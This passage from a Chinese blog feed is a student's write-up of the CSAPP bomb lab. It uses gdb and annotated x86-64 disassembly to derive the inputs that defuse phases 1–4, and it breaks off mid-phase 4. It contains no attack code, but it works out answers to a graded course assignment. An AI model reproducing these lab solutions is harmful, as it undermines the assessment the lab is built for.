    
    
    <tags>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>csapp_lab2</title>
    <link href="/2023/07/29/csapp-lab2/"/>
    <url>/2023/07/29/csapp-lab2/</url>
    
    <content type="html"><![CDATA[<p><img src="http://woaixiaoxiao-image.oss-cn-beijing.aliyuncs.com/img/20231224202009.png" alt="20231224202009"></p><h1 id="寄存器相关的知识"><a href="#寄存器相关的知识" class="headerlink" title="寄存器相关的知识"></a>寄存器相关的知识</h1><p><img src="http://woaixiaoxiao-image.oss-cn-beijing.aliyuncs.com/img/20231224202024.png" alt="20231224202024"></p><p><img src="http://woaixiaoxiao-image.oss-cn-beijing.aliyuncs.com/img/20231224202037.png" alt="20231224202037"></p><p><img src="http://woaixiaoxiao-image.oss-cn-beijing.aliyuncs.com/img/20231224202045.png" alt="20231224202045"></p><h1 id="phase1"><a href="#phase1" class="headerlink" title="phase1"></a>phase1</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 对bomb可执行文件进行调试</span><br>gdb bomb<br><span class="hljs-comment">// 通过disas指令可以通过反汇编操作查看phase_1这个函数的汇编代码</span><br>disas phase_1<br><span class="hljs-comment">// 或者可以直接通过这个指令生成整个反汇编文件</span><br>objdump -d bomb &gt; bomb.s<br></code></pre></td></tr></table></figure><ol><li>通过下面这个文件可以发现，read_line函数的结果rax放入了rdi寄存器，也就是作为phase_1函数的第一个参数，然后调用了phase_1函数<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">400e32</span>:e8 <span class="hljs-number">67</span> <span class="hljs-number">06</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40149</span>e &lt;read_line&gt;<br><span class="hljs-number">400e37</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> c7             mov    %rax,%rdi<br><span class="hljs-number">400e3</span>a:e8 a1 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">400</span>ee0 &lt;phase_1&gt;<br></code></pre></td></tr></table></figure></li><li>在phase_1函数中，又将0x402400放入esi寄存器，调用了strings_not_equal函数。</li><li>此时rdi寄存器存的是readline函数的结果，esi寄存器存的是一个地址，分别作为strings_not_equal函数第一个和第二个参数。</li><li>因此可以猜测，我们需要输入的就是0x402400这个地方存的字符串。通过<code>x/s 0x402400</code>即可获得这个字符串<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++">Dump of assembler code <span class="hljs-keyword">for</span> function phase_1:<br>   <span class="hljs-comment">// 函数调用时的压栈操作</span><br>   <span class="hljs-number">0x0000000000400ee0</span> &lt;+<span class="hljs-number">0</span>&gt;:     sub    $<span class="hljs-number">0x8</span>,%rsp<br>   <span class="hljs-comment">// 将0x402400这个地址放入esi寄存器</span><br>   <span class="hljs-comment">// 作为strings_not_equal的一个参数</span><br>   <span class="hljs-number">0x0000000000400ee4</span> &lt;+<span class="hljs-number">4</span>&gt;:     mov    $<span class="hljs-number">0x402400</span>,%esi<br>   <span class="hljs-number">0x0000000000400ee9</span> &lt;+<span class="hljs-number">9</span>&gt;:     callq  <span class="hljs-number">0x401338</span> &lt;strings_not_equal&gt;<br>   <span class="hljs-comment">// 将eax和eax寄存器进行按位与操作，并把结果放入标志寄存器</span><br>   <span class="hljs-comment">// eax是上面那个函数的返回值，如果eax为0，说明这两个字符是相同的</span><br>   <span class="hljs-number">0x0000000000400eee</span> &lt;+<span class="hljs-number">14</span>&gt;:    test   %eax,%eax<br>   <span class="hljs-comment">// 如果零标志位为1，则je成功运行，即躲过explode_bomb</span><br>   <span class="hljs-comment">// 也就是说零标志位如果是0，代表eax不是0，那么就会爆炸</span><br>   <span class="hljs-number">0x0000000000400ef0</span> &lt;+<span class="hljs-number">16</span>&gt;:    je     <span class="hljs-number">0x400ef7</span> &lt;phase_1+<span class="hljs-number">23</span>&gt;<br>   <span class="hljs-comment">// 爆炸</span><br>   <span class="hljs-number">0x0000000000400ef2</span> &lt;+<span class="hljs-number">18</span>&gt;:    callq  <span class="hljs-number">0x40143a</span> &lt;explode_bomb&gt;<br>   <span class="hljs-number">0x0000000000400ef7</span> &lt;+<span class="hljs-number">23</span>&gt;:    add    $<span class="hljs-number">0x8</span>,%rsp<br>   <span class="hljs-number">0x0000000000400efb</span> &lt;+<span class="hljs-number">27</span>&gt;:    retq<br>End of assembler dump.<br></code></pre></td></tr></table></figure></li></ol><h1 id="phase2"><a href="#phase2" class="headerlink" title="phase2"></a>phase2</h1><p>反汇编代码如下<br>这个phase的大意是通过sccanf读取我们输入的6个数字，如果能够满足是1 2 4 8 16 32的话，那就可以通过。<br>结合着汇编代码去看，应该不难理解这个phase的意思。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">0000000000400</span>efc &lt;phase_2&gt;:<br>  <span class="hljs-number">400</span>efc:<span class="hljs-number">55</span>                   push   %rbp<br>  <span class="hljs-number">400</span>efd:<span class="hljs-number">53</span>                   push   %rbx<br>  <span class="hljs-number">400</span>efe:<span class="hljs-number">48</span> <span class="hljs-number">83</span> ec <span class="hljs-number">28</span>          sub    $<span class="hljs-number">0x28</span>,%rsp<br>  <span class="hljs-number">400f</span>02:<span class="hljs-number">48</span> <span class="hljs-number">89</span> e6             mov    %rsp,%rsi<br>  <span class="hljs-number">400f</span>05:e8 <span class="hljs-number">52</span> <span class="hljs-number">05</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40145</span>c &lt;read_six_numbers&gt;<br>  <span class="hljs-number">400f</span>0a:<span class="hljs-number">83</span> <span class="hljs-number">3</span>c <span class="hljs-number">24</span> <span class="hljs-number">01</span>          cmpl   $<span class="hljs-number">0x1</span>,(%rsp) <span class="hljs-comment">// 栈指针指向的内存的值应该是1</span><br>  <span class="hljs-number">400f</span>0e:<span class="hljs-number">74</span> <span class="hljs-number">20</span>                je     <span class="hljs-number">400f</span>30 &lt;phase_2+<span class="hljs-number">0x34</span>&gt;<br>  <span class="hljs-number">400f</span>10:e8 <span class="hljs-number">25</span> <span class="hljs-number">05</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-number">400f</span>15:eb <span class="hljs-number">19</span>                jmp    <span class="hljs-number">400f</span>30 &lt;phase_2+<span class="hljs-number">0x34</span>&gt;<br>  <span class="hljs-number">400f</span>17:<span class="hljs-number">8b</span> <span class="hljs-number">43</span> fc             mov    <span class="hljs-number">-0x4</span>(%rbx),%eax <span class="hljs-comment">// 将rbx-4的位置的内存值给到eax</span><br>  <span class="hljs-number">400f</span>1a:<span class="hljs-number">01</span> c0                add    %eax,%eax <span class="hljs-comment">// eax乘2</span><br>  <span class="hljs-number">400f</span>1c:<span class="hljs-number">39</span> <span class="hljs-number">03</span>                cmp    %eax,(%rbx) <span class="hljs-comment">// 即eax乘2后，要等于rbx指向的值，eax实际上是rbx下面的一个值</span><br>  <span class="hljs-number">400f</span>1e:<span class="hljs-number">74</span> <span class="hljs-number">05</span>                je     <span class="hljs-number">400f</span>25 &lt;phase_2+<span class="hljs-number">0x29</span>&gt;<br>  <span class="hljs-number">400f</span>20:e8 <span class="hljs-number">15</span> <span class="hljs-number">05</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-number">400f</span>25:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c3 <span class="hljs-number">04</span>          add    $<span class="hljs-number">0x4</span>,%rbx <span class="hljs-comment">// 再给rbx+4</span><br>  <span class="hljs-number">400f</span>29:<span class="hljs-number">48</span> <span class="hljs-number">39</span> eb             cmp    %rbp,%rbx<br>  <span class="hljs-number">400f</span>2c:<span class="hljs-number">75</span> e9                jne    <span class="hljs-number">400f</span>17 &lt;phase_2+<span class="hljs-number">0x1b</span>&gt; <span class="hljs-comment">// 重复</span><br>  <span class="hljs-number">400f</span>2e:eb <span class="hljs-number">0</span>c                jmp    <span class="hljs-number">400f</span>3c &lt;phase_2+<span class="hljs-number">0x40</span>&gt; <span class="hljs-comment">//结束当前程序</span><br>  <span class="hljs-number">400f</span>30:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">5</span>c <span class="hljs-number">24</span> <span class="hljs-number">04</span>       lea    <span class="hljs-number">0x4</span>(%rsp),%rbx <span class="hljs-comment">// 栈顶指针+4，给到rbx</span><br>  <span class="hljs-number">400f</span>35:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">6</span>c <span class="hljs-number">24</span> <span class="hljs-number">18</span>       lea    <span class="hljs-number">0x18</span>(%rsp),%rbp <span class="hljs-comment">// 栈顶指针+24，给到rbp，即栈底指针</span><br>  <span class="hljs-number">400f</span>3a:eb db                jmp    <span class="hljs-number">400f</span>17 &lt;phase_2+<span class="hljs-number">0x1b</span>&gt;<br>  <span class="hljs-number">400f</span>3c:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c4 <span class="hljs-number">28</span>          add    $<span class="hljs-number">0x28</span>,%rsp<br>  <span class="hljs-number">400f</span>40:<span class="hljs-number">5b</span>                   pop    %rbx<br>  <span class="hljs-number">400f</span>41:<span class="hljs-number">5</span>d                   pop    %rbp<br>  <span class="hljs-number">400f</span>42:c3                   retq   <br></code></pre></td></tr></table></figure><p>但是有个问题就是，我们输入的应该是正序还是倒序的？这个需要结合read_six_numbers来看了。</p><ol><li>这个函数其实关键是调用了sscanf函数，解析我们输入的字符串</li><li>而sccanf的参数为<code>int sscanf(const char *str, const char *format, ...)</code>，其中后面的省略号就是通过str解析出来的结果，可能有多个，在这里，就是6个数字。</li><li>可以发现，这里将0x4025c3放入了esi，即作为sscanf的第二个参数，那么说明这个地址存放的东西就是解析的format，通过打印这个地址的值可以发现就是”%d %d %d %d %d %d”，说明除了str和format，我们还需要传递六个参数。</li><li>可以发现，第一个参数rdi，这里没有显式地设置，因为这个rdi从phase_2函数开始就没有变过，一直都是我们输入的字符串。</li><li>read_six_numbers在调用sscanf之前的那么多行，其实就是在传递后面的六个参数，也就是第3个到第8个参数。</li><li>通过前几行就可以发现，第1个值被放在了rsi处，而rsi其实就是phase_2的栈顶位置，也就是说第一个被解析出来的值放在栈底，也就是1。因此我们的字符串应该是从1开始增长，而不是从32开始逆序<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">000000000040145</span>c &lt;read_six_numbers&gt;:<br>  <span class="hljs-number">40145</span>c:<span class="hljs-number">48</span> <span class="hljs-number">83</span> ec <span class="hljs-number">18</span>          sub    $<span class="hljs-number">0x18</span>,%rsp<br>  <span class="hljs-number">401460</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> f2             mov    %rsi,%rdx <span class="hljs-comment">// 第3个参数，也是被解析的第一个值</span><br>  <span class="hljs-number">401463</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">4</span>e <span class="hljs-number">04</span>          lea    <span class="hljs-number">0x4</span>(%rsi),%rcx <span class="hljs-comment">// 第4个参数，也是被解析的第二个值</span><br>  <span class="hljs-number">401467</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">46</span> <span class="hljs-number">14</span>          lea    <span class="hljs-number">0x14</span>(%rsi),%rax<br>  <span class="hljs-number">40146b</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">08</span>       mov    %rax,<span class="hljs-number">0x8</span>(%rsp)<br>  <span class="hljs-number">401470</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">46</span> <span class="hljs-number">10</span>          lea    <span class="hljs-number">0x10</span>(%rsi),%rax<br>  <span class="hljs-number">401474</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span>          mov    %rax,(%rsp)<br>  <span class="hljs-number">401478</span>:<span class="hljs-number">4</span>c <span class="hljs-number">8</span>d <span class="hljs-number">4</span>e <span class="hljs-number">0</span>c          lea    <span class="hljs-number">0xc</span>(%rsi),%r9<br>  <span class="hljs-number">40147</span>c:<span class="hljs-number">4</span>c <span class="hljs-number">8</span>d <span class="hljs-number">46</span> <span class="hljs-number">08</span>          lea    <span class="hljs-number">0x8</span>(%rsi),%r8<br>  <span class="hljs-number">401480</span>:be c3 <span class="hljs-number">25</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span>       mov    $,%esi<br>  <span class="hljs-number">401485</span>:b8 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x0</span>,%eax<br>  <span class="hljs-number">40148</span>a:e8 <span class="hljs-number">61</span> f7 ff ff       callq  <span class="hljs-number">400b</span>f0 &lt;__isoc99_sscanf@plt&gt;<br>  <span class="hljs-number">40148f</span>:<span class="hljs-number">83</span> f8 <span class="hljs-number">05</span>             cmp    $<span class="hljs-number">0x5</span>,%eax<br>  <span class="hljs-number">401492</span>:<span class="hljs-number">7f</span> <span class="hljs-number">05</span>                jg     <span class="hljs-number">401499</span> &lt;read_six_numbers+<span class="hljs-number">0x3d</span>&gt;<br>  <span class="hljs-number">401494</span>:e8 a1 ff ff ff       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-number">401499</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c4 <span class="hljs-number">18</span>          add    $<span class="hljs-number">0x18</span>,%rsp<br>  <span class="hljs-number">40149</span>d:c3                   retq   <br></code></pre></td></tr></table></figure></li></ol><h1 id="phase3"><a href="#phase3" class="headerlink" title="phase3"></a>phase3</h1><p>这个phase会让你输入两个数字</p><ul><li>第一个数字是介于0-6之间的数，小于7即可</li><li>第二个数字根据第一个数字，通过switch指令进行跳转<br>一开始做的时候还没看懂那个switch的跳转指令。通过gdb调试不断往下走才确定了我输入的6对应的是哪个位置。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">0000000000400f</span>43 &lt;phase_3&gt;:<br>  <span class="hljs-number">400f</span>43:<span class="hljs-number">48</span> <span class="hljs-number">83</span> ec <span class="hljs-number">18</span>          sub    $<span class="hljs-number">0x18</span>,%rsp <span class="hljs-comment">// 减小栈指针，挪出24字节的空间</span><br>  <span class="hljs-number">400f</span>47:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">4</span>c <span class="hljs-number">24</span> <span class="hljs-number">0</span>c       lea    <span class="hljs-number">0xc</span>(%rsp),%rcx <span class="hljs-comment">// 栈指针+12 给rcx</span><br>  <span class="hljs-number">400f</span>4c:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">54</span> <span class="hljs-number">24</span> <span class="hljs-number">08</span>       lea    <span class="hljs-number">0x8</span>(%rsp),%rdx <span class="hljs-comment">// 栈指针+8 给rdx</span><br>  <span class="hljs-number">400f</span>51:be cf <span class="hljs-number">25</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x4025cf</span>,%esi <span class="hljs-comment">// %d %d，sscanf的参数</span><br>  <span class="hljs-number">400f</span>56:b8 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x0</span>,%eax<br>  <span class="hljs-number">400f</span>5b:e8 <span class="hljs-number">90</span> fc ff ff       callq  <span class="hljs-number">400b</span>f0 &lt;__isoc99_sscanf@plt&gt;<br>  <span class="hljs-number">400f</span>60:<span class="hljs-number">83</span> f8 <span class="hljs-number">01</span>             cmp    $<span class="hljs-number">0x1</span>,%eax <span class="hljs-comment">// 匹配成功的数目要大于1，即大于等于2，应该是2</span><br>  <span class="hljs-number">400f</span>63:<span class="hljs-number">7f</span> <span class="hljs-number">05</span>                jg     <span class="hljs-number">400f</span>6a &lt;phase_3+<span class="hljs-number">0x27</span>&gt;<br>  <span class="hljs-number">400f</span>65:e8 d0 <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-number">400f</span>6a:<span class="hljs-number">83</span> <span class="hljs-number">7</span>c <span class="hljs-number">24</span> <span class="hljs-number">08</span> <span class="hljs-number">07</span>       cmpl   $<span class="hljs-number">0x7</span>,<span class="hljs-number">0x8</span>(%rsp) <br>  <span class="hljs-number">400f</span>6f:<span class="hljs-number">77</span> <span class="hljs-number">3</span>c                ja     <span class="hljs-number">400f</span>ad &lt;phase_3+<span class="hljs-number">0x6a</span>&gt; <span class="hljs-comment">// 7如果大于rsp+8指向的值，则直接爆炸</span><br>  <span class="hljs-number">400f</span>71:<span class="hljs-number">8b</span> <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">08</span>          mov    <span class="hljs-number">0x8</span>(%rsp),%eax <span class="hljs-comment">// rsp+8指向的值给eax</span><br>  <span class="hljs-number">400f</span>75:ff <span class="hljs-number">24</span> c5 <span class="hljs-number">70</span> <span class="hljs-number">24</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> jmpq   *<span class="hljs-number">0x402470</span>(,%rax,<span class="hljs-number">8</span>) <span class="hljs-comment">// 间接寻址0x402470+8*rax，其实这里就是个switch操作，根据你输入的第一个数字是0-6，给你传送到下面对应的mov</span><br>  <span class="hljs-number">400f</span>7c:b8 cf <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0xcf</span>,%eax <span class="hljs-comment">// 将eax置为0xcf，即11001111 15+64+128=207</span><br>  <span class="hljs-number">400f</span>81:eb <span class="hljs-number">3b</span>                jmp    <span class="hljs-number">400f</span>be &lt;phase_3+<span class="hljs-number">0x7b</span>&gt;<br>  <span class="hljs-number">400f</span>83:b8 c3 <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x2c3</span>,%eax<br>  <span class="hljs-number">400f</span>88:eb <span class="hljs-number">34</span>                jmp    <span class="hljs-number">400f</span>be &lt;phase_3+<span class="hljs-number">0x7b</span>&gt;<br>  <span class="hljs-number">400f</span>8a:b8 <span class="hljs-number">00</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x100</span>,%eax<br>  <span class="hljs-number">400f</span>8f:eb <span class="hljs-number">2</span>d                jmp    <span class="hljs-number">400f</span>be &lt;phase_3+<span class="hljs-number">0x7b</span>&gt;<br>  <span class="hljs-number">400f</span>91:b8 <span class="hljs-number">85</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x185</span>,%eax<br>  <span class="hljs-number">400f</span>96:eb <span class="hljs-number">26</span>                jmp    <span class="hljs-number">400f</span>be &lt;phase_3+<span class="hljs-number">0x7b</span>&gt;<br>  <span class="hljs-number">400f</span>98:b8 ce <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0xce</span>,%eax<br>  <span class="hljs-number">400f</span>9d:eb <span class="hljs-number">1f</span>                jmp    <span class="hljs-number">400f</span>be &lt;phase_3+<span class="hljs-number">0x7b</span>&gt;<br>  <span class="hljs-number">400f</span>9f:b8 aa <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x2aa</span>,%eax<br>  <span class="hljs-number">400f</span>a4:eb <span class="hljs-number">18</span>                jmp    <span class="hljs-number">400f</span>be &lt;phase_3+<span class="hljs-number">0x7b</span>&gt;<br>  <span class="hljs-number">400f</span>a6:b8 <span class="hljs-number">47</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x147</span>,%eax<br>  <span class="hljs-number">400f</span>ab:eb <span class="hljs-number">11</span>                jmp    <span class="hljs-number">400f</span>be &lt;phase_3+<span class="hljs-number">0x7b</span>&gt;<br>  <span class="hljs-number">400f</span>ad:e8 <span class="hljs-number">88</span> <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-number">400f</span>b2:b8 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x0</span>,%eax<br>  <span class="hljs-number">400f</span>b7:eb <span class="hljs-number">05</span>                jmp    <span class="hljs-number">400f</span>be &lt;phase_3+<span class="hljs-number">0x7b</span>&gt;<br>  <span class="hljs-number">400f</span>b9:b8 <span class="hljs-number">37</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x137</span>,%eax<br>  <span class="hljs-number">400f</span>be:<span class="hljs-number">3b</span> <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">0</span>c          cmp    <span class="hljs-number">0xc</span>(%rsp),%eax <span class="hljs-comment">// 比较eax是否等于rsp+12指向的值</span><br>  <span class="hljs-number">400f</span>c2:<span class="hljs-number">74</span> <span class="hljs-number">05</span>                je     <span class="hljs-number">400f</span>c9 &lt;phase_3+<span class="hljs-number">0x86</span>&gt; <span class="hljs-comment">// 等于的话，直接退出程序</span><br>  <span class="hljs-number">400f</span>c4:e8 <span class="hljs-number">71</span> <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt; <span class="hljs-comment">// 不等于的话，就爆炸</span><br>  <span class="hljs-number">400f</span>c9:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c4 <span class="hljs-number">18</span>          add    $<span class="hljs-number">0x18</span>,%rsp<br>  <span class="hljs-number">400f</span>cd:c3                   retq   <br></code></pre></td></tr></table></figure></li></ul><h1 id="phase4"><a href="#phase4" class="headerlink" title="phase4"></a>phase4</h1><p>phase_4反汇编的代码如下<br>要求我们两个数字，其中第一个数字要小于等于14，第二个数字必须为0。其中第一个数字要通过func4函数，并且使其返回0。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">000000000040100</span>c &lt;phase_4&gt;:<br>  <span class="hljs-number">40100</span>c:<span class="hljs-number">48</span> <span class="hljs-number">83</span> ec <span class="hljs-number">18</span>          sub    $<span class="hljs-number">0x18</span>,%rsp <span class="hljs-comment">// 栈指针下移，挪出24字节的位置</span><br>  <span class="hljs-number">401010</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">4</span>c <span class="hljs-number">24</span> <span class="hljs-number">0</span>c       lea    <span class="hljs-number">0xc</span>(%rsp),%rcx <span class="hljs-comment">// 将rcx置为栈顶指针+12</span><br>  <span class="hljs-number">401015</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">54</span> <span class="hljs-number">24</span> <span class="hljs-number">08</span>       lea    <span class="hljs-number">0x8</span>(%rsp),%rdx <span class="hljs-comment">// 将rdx置为栈顶指针+8</span><br>  <span class="hljs-number">40101</span>a:be cf <span class="hljs-number">25</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x4025cf</span>,%esi <span class="hljs-comment">// </span><br>  <span class="hljs-number">40101f</span>:b8 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x0</span>,%eax<br>  <span class="hljs-number">401024</span>:e8 c7 fb ff ff       callq  <span class="hljs-number">400b</span>f0 &lt;__isoc99_sscanf@plt&gt;<br>  <span class="hljs-number">401029</span>:<span class="hljs-number">83</span> f8 <span class="hljs-number">02</span>             cmp    $<span class="hljs-number">0x2</span>,%eax<br>  <span class="hljs-number">40102</span>c:<span class="hljs-number">75</span> <span class="hljs-number">07</span>                jne    <span class="hljs-number">401035</span> &lt;phase_4+<span class="hljs-number">0x29</span>&gt; <span class="hljs-comment">// 如果输入参数个数不是两个，直接爆炸</span><br>  <span class="hljs-number">40102</span>e:<span class="hljs-number">83</span> <span class="hljs-number">7</span>c <span class="hljs-number">24</span> <span class="hljs-number">08</span> <span class="hljs-number">0</span>e       cmpl   $<span class="hljs-number">0xe</span>,<span class="hljs-number">0x8</span>(%rsp) <span class="hljs-comment">// 将14 和 栈顶指针+8指向的值 比较</span><br>  <span class="hljs-number">401033</span>:<span class="hljs-number">76</span> <span class="hljs-number">05</span>                jbe    <span class="hljs-number">40103</span>a &lt;phase_4+<span class="hljs-number">0x2e</span>&gt; <span class="hljs-comment">// 如果小于等于，则跳过炸弹继续执行</span><br>  <span class="hljs-number">401035</span>:e8 <span class="hljs-number">00</span> <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt; <span class="hljs-comment">// 如果大于则直接爆炸</span><br>  <span class="hljs-number">40103</span>a:ba <span class="hljs-number">0</span>e <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0xe</span>,%edx <span class="hljs-comment">// 将edx置为14，func4的第3个参数</span><br>  <span class="hljs-number">40103f</span>:be <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x0</span>,%esi <span class="hljs-comment">// 将esi置为0，func4的第2个参数</span><br>  <span class="hljs-number">401044</span>:<span class="hljs-number">8b</span> <span class="hljs-number">7</span>c <span class="hljs-number">24</span> <span class="hljs-number">08</span>          mov    <span class="hljs-number">0x8</span>(%rsp),%edi <span class="hljs-comment">// 将rsp+8指向的值给edi，func4的第1个参数</span><br>  <span class="hljs-number">401048</span>:e8 <span class="hljs-number">81</span> ff ff ff       callq  <span class="hljs-number">400f</span>ce &lt;func4&gt; <span class="hljs-comment">// 调用一个函数</span><br>  <span class="hljs-number">40104</span>d:<span class="hljs-number">85</span> c0                test   %eax,%eax <span class="hljs-comment">// 如果eax不为0，则直接爆炸</span><br>  <span class="hljs-number">40104f</span>:<span class="hljs-number">75</span> <span class="hljs-number">07</span>                jne    <span class="hljs-number">401058</span> &lt;phase_4+<span class="hljs-number">0x4c</span>&gt; <span 